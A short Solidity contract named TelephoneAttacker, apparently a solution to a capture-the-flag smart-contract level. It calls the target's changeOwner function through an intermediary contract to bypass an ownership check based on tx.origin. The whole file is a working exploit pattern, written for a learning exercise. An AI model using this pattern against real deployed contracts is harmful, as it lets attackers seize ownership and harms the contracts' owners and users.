// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttacker {
        Telephone public telephone;

        constructor(address _telephoneAddress){
                telephone = Telephone(_telephoneAddress);
        }

        function attack (address _owner) public {
                telephone.changeOwner(_owner);
        }
}